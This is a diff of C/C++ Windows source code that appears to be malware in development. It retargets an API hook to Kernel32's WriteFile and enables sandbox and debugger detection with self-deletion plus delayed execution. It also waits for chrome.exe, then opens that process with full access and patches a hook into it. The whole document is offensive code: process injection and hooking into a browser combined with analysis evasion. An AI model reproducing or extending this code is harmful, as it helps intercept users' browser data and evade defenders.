@@ -5,11 +5,20 @@
 #include "../headers/payload.h"
 
 
-#define TARGET_FUNC	"MessageBoxA"
-#define TARGET_DLL	"User32.dll"
+#define TARGET_FUNC	"WriteFile"
+#define TARGET_DLL	"Kernel32"
+
+// Get rid of weird crt call because of float
+#ifdef __cplusplus
+extern "C" {
+#endif
+	int _fltused = 0; // it should be a single underscore since the double one is the mangled name
+#ifdef __cplusplus
+}
+#endif
 
 
-DWORD GetPID(const char* process, API::API_ACCESS& api);
+DWORD GetPID(const char* process);
 void ExitProgram(const char* message);
 
 // spawn calculator
@@ -45,10 +54,9 @@ WCHAR* debuggers[] = {
 };
 */
 
-
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-	AntiAnalysis debug;
+	AntiAnalysis hide;
 	
 	ULONG_PTR uAddress = NULL;
 
@@ -59,7 +67,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	resolver.ResolveFunctions();
 
 	auto resolved	  = resolver.GetAPIAccess();
-	//debug.IsBeingWatched(resolver); // Nuke self if in sandbox or debugger
+	
+	//hide.DelayExecution(5, resolver); // wait 5 minutes before execution
+
+	
+	DWORD process = 0; 
+
+	do
+	{
+		hide.IsBeingWatched(resolver); // Nuke self if in sandbox or debugger
+		process = GetPID("chrome.exe");
+		hide.DelayExecution(0.2, resolver);
+
+
+	} while (process == 0);
+
 
 	HMODULE hModule = GetModuleHandleA(TARGET_DLL);
 
@@ -80,7 +102,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	PatchHook(pFunctionToHook);
 
-	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, GetPID("payload.exe", resolved));
+
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, process);
 
 	if (hProcess == INVALID_HANDLE_VALUE)
 		ExitProgram("failed to get a handle to the process");
@@ -109,7 +132,7 @@ void ExitProgram(const char* message)
 }
 
 
-DWORD GetPID(const char* process, API::API_ACCESS& api) {
+DWORD GetPID(const char* process) {
 	DWORD processId = 0;
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (snapshot != INVALID_HANDLE_VALUE) {
